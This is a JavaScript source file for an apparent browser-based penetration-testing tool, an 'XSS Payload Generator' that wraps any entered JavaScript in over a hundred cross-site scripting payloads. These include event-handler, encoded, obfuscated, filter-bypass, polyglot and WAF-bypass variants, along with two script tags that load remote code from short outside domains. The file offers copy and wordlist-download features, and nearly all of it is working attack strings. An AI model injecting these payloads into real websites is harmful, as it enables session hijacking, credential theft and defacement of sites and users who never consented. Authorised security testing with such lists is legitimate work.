// ========================================
// XSS PAYLOAD GENERATOR
// Category: Purple Team
// ========================================

(function() {
    'use strict';

    function render() {
        return `
            <div class="mb-4">
                <h4><i class="bi bi-bug-fill"></i> XSS Payload Generator</h4>
                <p class="text-secondary">Generate various XSS payloads for security testing</p>
            </div>
            
            <div class="alert alert-warning">
                <i class="bi bi-exclamation-triangle-fill"></i> <strong>Warning:</strong> Use these payloads only for authorized security testing and educational purposes.
            </div>
            
            <div class="mb-3">
                <label for="xssInput" class="form-label">JavaScript Code</label>
                <input type="text" class="form-control font-monospace" id="xssInput" placeholder="alert(document.domain)" value="alert(document.domain)">
                <small class="text-secondary">Enter the JavaScript code to inject (e.g., alert(1), console.log('XSS'))</small>
            </div>
            
            <div class="mb-3">
                <label class="form-label">Payload Categories</label>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catBasic" checked>
                    <label class="form-check-label" for="catBasic">Basic Tags</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catEvent" checked>
                    <label class="form-check-label" for="catEvent">Event Handlers</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catEncoded" checked>
                    <label class="form-check-label" for="catEncoded">Encoded Variants</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catObfuscated" checked>
                    <label class="form-check-label" for="catObfuscated">Obfuscated</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catFilter" checked>
                    <label class="form-check-label" for="catFilter">Filter Bypass</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catPolyglot" checked>
                    <label class="form-check-label" for="catPolyglot">Polyglots</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="catWaf" checked>
                    <label class="form-check-label" for="catWaf">WAF Bypass</label>
                </div>
            </div>
            
            <button class="btn btn-primary" id="generateBtn">
                <i class="bi bi-hammer"></i> Generate Payloads
            </button>
            
            <button class="btn btn-primary ms-2" id="copyAllBtn">
                <i class="bi bi-clipboard"></i> Copy All
            </button>
            
            <button class="btn btn-primary ms-2" id="downloadBtn">
                <i class="bi bi-download"></i> Download Wordlist
            </button>
            
            <div id="xssResults" class="mt-4"></div>
        `;
    }

    function init() {
        let currentPayloads = [];

        function generatePayloads() {
            const input = document.getElementById('xssInput').value.trim();
            const resultsDiv = document.getElementById('xssResults');
            
            if (!input) {
                resultsDiv.innerHTML = '<div class="alert alert-warning">Please enter JavaScript code</div>';
                return;
            }

            const categories = {
                basic: document.getElementById('catBasic').checked,
                event: document.getElementById('catEvent').checked,
                encoded: document.getElementById('catEncoded').checked,
                obfuscated: document.getElementById('catObfuscated').checked,
                filter: document.getElementById('catFilter').checked,
                polyglot: document.getElementById('catPolyglot').checked,
                waf: document.getElementById('catWaf').checked
            };

            const payloads = [];

            // Basic Script Tags
            if (categories.basic) {
                payloads.push({
                    category: 'Basic Script Tags',
                    items: [
                        `<script>${input}</script>`,
                        `<script src=data:text/javascript,${input}></script>`,
                        `<script>/*--></script><script>${input}</script>`,
                        `<script>${input}//`,
                        `<script>${input}</script><!--`,
                        `<SCRIPT>${input}</SCRIPT>`,
                        `<ScRiPt>${input}</ScRiPt>`,
                        `<script>${input}</script  >`,
                        `<script type="text/javascript">${input}</script>`,
                        `<script language="javascript">${input}</script>`,
                        `<script>eval('${input}')</script>`,
                        `<script>setTimeout('${input}')</script>`,
                        `<script>setInterval('${input}')</script>`,
                        `<script src=//14.rs></script>`,
                        `<script src=//xa.cz></script>`
                    ]
                });
            }

            // Event Handlers
            if (categories.event) {
                payloads.push({
                    category: 'Event Handler Payloads',
                    items: [
                        `<img src=x onerror=${input}>`,
                        `<img src=x onerror="${input}">`,
                        `<img src=x onerror='${input}'>`,
                        `<body onload=${input}>`,
                        `<svg onload=${input}>`,
                        `<svg/onload=${input}>`,
                        `<svg onload=${input}//`,
                        `<iframe onload=${input}>`,
                        `<input onfocus=${input} autofocus>`,
                        `<select onfocus=${input} autofocus>`,
                        `<textarea onfocus=${input} autofocus>`,
                        `<keygen onfocus=${input} autofocus>`,
                        `<marquee onstart=${input}>`,
                        `<marquee loop=1 width=0 onfinish=${input}>`,
                        `<div onmouseover=${input}>hover me</div>`,
                        `<img src=x onpointerenter=${input}>`,
                        `<details open ontoggle=${input}>`,
                        `<video src=x onerror=${input}>`,
                        `<audio src=x onerror=${input}>`,
                        `<object data=x onerror=${input}>`,
                        `<style onload=${input}></style>`,
                        `<form><button formaction="javascript:${input}">click</button></form>`,
                        `<body onpageshow=${input}>`,
                        `<body onhashchange=${input}>`,
                        `<frameset onload=${input}>`,
                        `<table background="javascript:${input}">`,
                        `<a onmouseover="${input}">hover</a>`,
                        `<div onwheel=${input}>scroll me</div>`,
                        `<img src=x ondragstart=${input}>`,
                        `<img src=x onauxclick=${input}>`,
                        `<img src=x oncontextmenu=${input}>`,
                        `<svg><animate onbegin=${input} attributeName=x dur=1s>`,
                        `<svg><set onbegin=${input} attributeName=x to=0>`
                    ]
                });
            }

            // Encoded Variants
            if (categories.encoded) {
                const htmlEncoded = input.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('');
                const hexHtmlEncoded = input.split('').map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
                
                payloads.push({
                    category: 'Encoded Variants',
                    items: [
                        `<img src=x onerror="${htmlEncoded}">`,
                        `<img src=x onerror="${hexHtmlEncoded}">`,
                        `<img src=x onerror="eval(atob('${btoa(input)}'))">`,
                        `<iframe src="javascript:${encodeURIComponent(input)}">`,
                        `<a href="javascript:${encodeURIComponent(input)}">click</a>`,
                        `<img src=x onerror="&#0000097&#0000108&#0000101&#0000114&#0000116(1)">`,
                        `<iframe src="data:text/html,<script>${input}</script>">`,
                        `<object data="data:text/html,<script>${input}</script>">`,
                        `<embed src="data:text/html,<script>${input}</script>">`,
                        `<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">`,
                        `<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;(1)</script></svg>`,
                        `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:${input}">click</a>`,
                        `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:${input}">click</a>`
                    ]
                });
            }

            // Obfuscated
            if (categories.obfuscated) {
                const charCodes = input.split('').map(c => c.charCodeAt(0)).join(',');
                
                payloads.push({
                    category: 'Obfuscated Payloads',
                    items: [
                        `<script>eval(String.fromCharCode(${charCodes}))</script>`,
                        `<script>setTimeout(${input})</script>`,
                        `<script>setInterval(${input})</script>`,
                        `<script>Function("${input.replace(/"/g, '\\"')}")()</script>`,
                        `<img src=x onerror="window['al'+'ert'](1)">`,
                        `<img src=x onerror="top['al'+'ert'](1)">`,
                        `<script>with(document)with(body)with(appendChild(createElement('script')))src='data:,${input}'</script>`,
                        `<svg><script>&#97;&#108;&#101;&#114;&#116&#40;1&#41;</script></svg>`,
                        `<script>_='${input}',eval(_)</script>`,
                        `<script>0['constructor']['constructor']('${input}')()</script>`,
                        `<svg><script>alert&lpar;1&rpar;</script></svg>`,
                        `<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;</script></svg>`
                    ]
                });
            }

            // Filter Bypass
            if (categories.filter) {
                payloads.push({
                    category: 'Filter Bypass Techniques',
                    items: [
                        `<scr<script>ipt>${input}</scr</script>ipt>`,
                        `<svg><script>alert&lpar;1&rpar;</script></svg>`,
                        `<iframe src=javas&#x09;cript:${input}>`,
                        `<iframe src=javas&#x0A;cript:${input}>`,
                        `<iframe src=javas&#x0D;cript:${input}>`,
                        `<<script>script>${input}<</script>/script>`,
                        `<img src=x oneonerrorrror=${input}>`,
                        `<img src=x on error=${input}>`,
                        `<script><!--${input}--></script>`,
                        `<img src=javascript:${input}>`,
                        `<image src=x onerror=${input}>`,
                        `<svg/onload=${input}>`,
                        `<iframe/src="javascript:${input}">`,
                        `<img/src=x/onerror=${input}>`,
                        `<script src="data:text/javascript,${encodeURIComponent(input)}"></script>`,
                        `<base href="javascript://">`,
                        `<object data="javascript:${input}">`,
                        `<embed src="javascript:${input}">`,
                        `<marquee onstart=${input}>`,
                        `<details open ontoggle=${input}>`,
                        `<iframe srcdoc="<script>${input}</script>">`
                    ]
                });
            }

            // Polyglots
            if (categories.polyglot) {
                payloads.push({
                    category: 'Polyglot Payloads',
                    items: [
                        `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+${input}//'>`,
                        `-->'"/></sCript><svG x=">" onload=(co\\u006efirm)()//`,
                        `<svg/onload=${input}//`,
                        `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>`,
                        `" onclick=${input}//<button ' onclick=${input}//> */ ${input}//`,
                        `'">><script>${input}</script>`,
                        `"><img src=x onerror=${input};>`,
                        `"><script>${input}</script>`,
                        `'--></script><script>${input}</script>`,
                        `'><script>${input}</script>`,
                        `"'><img src=x onerror=${input}//>`,
                        `javascript:${input}`
                    ]
                });
            }

            // WAF Bypass
            if (categories.waf) {
                payloads.push({
                    category: 'WAF Bypass Techniques',
                    items: [
                        `<script>${input}</script>`,
                        `<script     >${input}</script>`,
                        `<ScRiPt>${input}</ScRiPt>`,
                        `<svg/onload=${input}>`,
                        `<svg      onload=${input}>`,
                        `<svg//////onload=${input}>`,
                        `<svg id=x;onload=${input}>`,
                        `<img src=1 onerror=${input}>`,
                        `<img src=1 oNeRRor=${input}>`,
                        `<iframe src=javascript:${input}>`,
                        `<svg><animate onbegin=${input} attributeName=x></svg>`,
                        `<details open ontoggle=${input}>`,
                        `<img src=x:alert(alt) onerror=eval(src) alt=1>`,
                        `<script>onerror=${input};throw 1</script>`,
                        `<script>{onerror=${input}}throw 1</script>`,
                        `<script>throw onerror=${input},1</script>`,
                        `<svg onload=${input}>`,
                        `<svg//////onload=${input}>`,
                        `<svg id=x;onload=${input}>`
                    ]
                });
            }

            currentPayloads = payloads;

            // Generate HTML
            let html = '<div class="accordion" id="xssAccordion">';
            let totalPayloads = 0;

            payloads.forEach((category, idx) => {
                totalPayloads += category.items.length;
                const collapseId = `collapse${idx}`;
                const isFirst = idx === 0;

                html += `
                    <div class="accordion-item" style="background-color: #1a1d29; border-color: #2d3748;">
                        <h2 class="accordion-header">
                            <button class="accordion-button ${isFirst ? '' : 'collapsed'}" type="button" data-bs-toggle="collapse" data-bs-target="#${collapseId}" style="background-color: #2563eb; color: white;">
                                <i class="bi bi-folder-fill me-2"></i> ${category.category} (${category.items.length} payloads)
                            </button>
                        </h2>
                        <div id="${collapseId}" class="accordion-collapse collapse ${isFirst ? 'show' : ''}" data-bs-parent="#xssAccordion">
                            <div class="accordion-body" style="background-color: #1a1d29;">
                `;

                category.items.forEach((payload, payloadIdx) => {
                    html += `
                        <div class="mb-2">
                            <div class="code-block position-relative" style="background-color: #0f1419; padding: 12px; border-radius: 6px; border: 1px solid #2d3748;">
                                <code class="text-break" style="color: #e2e8f0;">${window.escapeHtml(payload)}</code>
                                <button class="btn btn-sm btn-outline-primary position-absolute top-0 end-0 m-1 copy-payload-btn" data-payload-text="${window.escapeHtml(payload)}">
                                    <i class="bi bi-clipboard"></i>
                                </button>
                            </div>
                        </div>
                    `;
                });

                html += `
                            </div>
                        </div>
                    </div>
                `;
            });

            html += '</div>';

            html = `
                <div class="alert alert-success mb-3">
                    <i class="bi bi-check-circle-fill"></i> Generated <strong>${totalPayloads}</strong> XSS payloads
                </div>
            ` + html;

            resultsDiv.innerHTML = html;

            // Add event listeners to copy buttons
            document.querySelectorAll('.copy-payload-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    const payload = this.getAttribute('data-payload-text');
                    const textarea = document.createElement('textarea');
                    textarea.value = payload;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    
                    const originalHtml = this.innerHTML;
                    this.innerHTML = '<i class="bi bi-check-fill"></i>';
                    this.classList.add('btn-success');
                    this.classList.remove('btn-outline-primary');
                    setTimeout(() => {
                        this.innerHTML = originalHtml;
                        this.classList.remove('btn-success');
                        this.classList.add('btn-outline-primary');
                    }, 2000);
                });
            });
        }

        function copyAllPayloads() {
            if (currentPayloads.length === 0) {
                alert('Please generate payloads first');
                return;
            }

            const allPayloads = [];
            currentPayloads.forEach(category => {
                category.items.forEach(payload => {
                    allPayloads.push(payload);
                });
            });

            const textarea = document.createElement('textarea');
            textarea.value = allPayloads.join('\n');
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);

            const btn = document.getElementById('copyAllBtn');
            const originalHtml = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check-fill"></i> Copied!';
            btn.classList.remove('btn-primary');
            btn.classList.add('btn-success');
            setTimeout(() => {
                btn.innerHTML = originalHtml;
                btn.classList.remove('btn-success');
                btn.classList.add('btn-primary');
            }, 2000);
        }

        function downloadWordlist() {
            if (currentPayloads.length === 0) {
                alert('Please generate payloads first');
                return;
            }

            const allPayloads = [];
            currentPayloads.forEach(category => {
                category.items.forEach(payload => {
                    allPayloads.push(payload);
                });
            });

            const content = allPayloads.join('\n');
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'xss-payloads-wordlist.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            const btn = document.getElementById('downloadBtn');
            const originalHtml = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check-fill"></i> Downloaded!';
            btn.classList.remove('btn-primary');
            btn.classList.add('btn-success');
            setTimeout(() => {
                btn.innerHTML = originalHtml;
                btn.classList.remove('btn-success');
                btn.classList.add('btn-primary');
            }, 2000);
        }

        // Attach event listeners
        document.getElementById('generateBtn').addEventListener('click', generatePayloads);
        document.getElementById('copyAllBtn').addEventListener('click', copyAllPayloads);
        document.getElementById('downloadBtn').addEventListener('click', downloadWordlist);
    }

    // Register the tool
    window.registerCyberSuiteTool({
        id: 'xss-payload-generator',
        name: 'XSS Payload Generator',
        description: 'Generate multiple XSS payloads for security testing and penetration testing',
        icon: 'bi-bug-fill',
        category: 'red',
        render: render,
        init: init
    });
})();